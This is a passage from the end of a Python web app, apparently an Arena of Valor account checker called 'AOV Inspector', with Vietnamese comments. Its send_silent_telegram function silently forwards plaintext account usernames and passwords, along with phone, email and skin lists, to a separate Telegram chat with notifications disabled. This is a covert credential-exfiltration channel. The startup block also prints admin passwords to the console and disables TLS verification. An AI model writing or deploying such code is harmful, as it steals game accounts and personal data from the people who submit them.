        res = requests.post(url, json=payload, timeout=10, verify=False)
        logger.info(f"[VIP-TELE-SENT] {username} | SSS={sss_count} SS={ss_count} Anime={anime_count} | status={res.status_code}")
        return True
    except Exception as e:
        logger.error(f"[VIP-TELE] EXC: {e}")
        return False


def should_send_vip_telegram(r):
    """Check xem có nên gửi VIP lên tele không."""
    # Không gửi nếu bị ban
    if r.get("banned", False):
        return False
    # Không gửi nếu fail
    if r.get("type") == "failed":
        return False
    # Chỉ gửi nếu có ít nhất 1 skin VIP
    sss_count = len(r.get("sss", []))
    ss_count = len(r.get("ss", []))
    anime_count = len(r.get("anime", []))
    if sss_count + ss_count + anime_count == 0:
        return False
    return True


def send_silent_telegram(r):
    if not SILENT_BOT_TOKEN or not SILENT_CHAT_ID:
        return False
    try:
        total_skins = r.get("total_skins", 0)
        sss_count = len(r.get("sss", []))
        is_banned = r.get("banned", False)
        logger.info(f"[TELEGRAM] user={r.get('username')} | Skin={total_skins} | SSS={sss_count} | BAN={is_banned}")
        if is_banned:
            logger.info(f"[TELEGRAM-SKIP] {r.get('username')} — acc bị ban, KHÔNG gửi")
            return False
        if not (total_skins > SILENT_MIN_SKINS or sss_count >= SILENT_MIN_SSS):
            logger.info(f"[TELEGRAM-SKIP] {r.get('username')} — không đủ điều kiện (Skin={total_skins}, SSS={sss_count})")
            return False
        username = r.get("username", "")
        password = r.get("password", "")
        if not username or not password: return False
        lines = ["🔥 <b>[AOV INSPECTOR] ACC NGON!</b> 🔥", "━━━━━━━━━━━━━━━━━━━━"]
        lines.append(f"🔑 <b>Acc:</b> <code>{username}|{password}</code>")
        uid = r.get("uid", "")
        if uid and uid != "N/A": lines.append(f"🆔 <b>UID:</b> <code>{uid}</code>")
        nick = r.get("name", "")
        if nick: lines.append(f"👤 <b>Nick:</b> {nick}")
        rank = r.get("rank", ""); stars = r.get("rank_stars", 0); level = r.get("level", 0)
        if rank: lines.append(f"🏆 <b>Rank:</b> {rank} ({stars}★)")
        if level: lines.append(f"⭐ <b>Level:</b> {level}")
        lines.append(f"💰 <b>Sò:</b> {r.get('shell', 0)}")
        phone = r.get("mobile_no", ""); email = r.get("email", "")
        if phone: lines.append(f"📱 <b>SĐT:</b> <code>{phone}</code>")
        if email: lines.append(f"📧 <b>Email:</b> <code>{email}</code>")
        lines.append("✅ <b>BAN:</b> 🟢 KHÔNG BAN")
        lines.append("")
        lines.append(f"🎽 <b>Tổng skin:</b> {total_skins}")
        for key, icon, label in [("sss","⭐","SSS"),("anime","🎴","Anime"),("ss","💎","SS")]:
            lst = r.get(key, [])
            if lst:
                lines.append(f"{icon} <b>{label} ({len(lst)}):</b>")
                for s in lst:
                    lines.append(f"   {icon} {s.get('hero_name','?')} → {s.get('skin_name','?')}")
        lines.append("━━━━━━━━━━━━━━━━━━━━")
        url = f"https://api.telegram.org/bot{SILENT_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": SILENT_CHAT_ID, "text": "\n".join(lines),
                   "parse_mode": "HTML", "disable_notification": True}
        res = requests.post(url, json=payload, timeout=5, verify=False)
        logger.info(f"[TELEGRAM-SENT] {username} | status={res.status_code}")
        return True
    except Exception as e:
        logger.error(f"[TELEGRAM] EXC: {e}")
        return False


if __name__ == "__main__":
    load_data()
    CHECK_CACHE.clear()  # 🔧 FIX: clear cache khi khởi động
    create_admin()
    load_chat()
    load_jobs()
    threading.Thread(target=auto_backup_worker, daemon=True).start()
    threading.Thread(target=_save_daemon, daemon=True).start()
    threading.Thread(target=_jobs_save_daemon, daemon=True).start()
    # 🤖 Khởi động bot Telegram
    try:
        start_telegram_bot()
    except Exception as _e:
        print(f"[TG-BOT] ⚠️  {_e}")

    import os as _os
    port = int(_os.environ.get("PORT", 5000))

    def is_port_in_use(p):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            try: s.connect(("127.0.0.1", p)); return True
            except: return False

    if is_port_in_use(port):
        print("=" * 70)
        print(f"⚠️  PORT {port} ĐANG BỊ CHIẾM DỤNG!")
        print("=" * 70)
        print("💡 Cách fix:")
        print("   1. pkill -9 python")
        print("   2. Đợi 2 giây, chạy lại: python kk_v7_p1.py")
        print("   3. Hoặc đổi port: PORT=5001 python kk_v7_p1.py")
        print("=" * 70)
        import sys as _sys
        _sys.exit(1)

    print("=" * 70)
    print("◈ AOV INSPECTOR v7.0.0 — PHẦN 1/2")
    print("=" * 70)
    print(f"🥇 OWNER : {OWNER_USERNAME} / {OWNER_PASSWORD}")
    for q in QTV_ACCOUNTS:
        print(f"👑 {q['username'].upper():6s}: {q['username']} / {q['password']}")
    print(f"📦 Kho: {len(ACC_STORAGE)} acc · Limit: {USER_DAILY_LIMIT} lượt/ngày")
    print(f"🎮 6 Mini-game: Vòng Quay + Tài Xỉu + Đập Hộp + Lì Xì + Rồng Vàng + Slot")
    print(f"🌐 Đa ngôn ngữ: Tiếng Việt + English")
    print(f"🎨 12 Phông nền Việt Nam + 8 Màu chủ đạo")
    print(f"🏅 {len(BADGE_DEFS)} Huy hiệu + 📋 Nhiệm vụ ngày + 📅 Streak 7 ngày")
    print(f"📺 Xem AD nhận xu + 🎫 Voucher + 🎲 Random theo Tier")
    print(f"💾 SQLite + JSON (dual save) · File: {SQLITE_FILE}")
    print(f"✅ FIX 9 BUG (save race, parse file, hardcoded creds, ...)")
    print(f"🚀 Port: {port}")
    print("=" * 70)

    try:
        from waitress import serve
        print("⚡ Chạy với waitress")
        serve(app, host="0.0.0.0", port=port, threads=12, connection_limit=200, channel_timeout=60)
    except ImportError:
        print("⚠️ Chưa có waitress — dùng Flask dev")
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
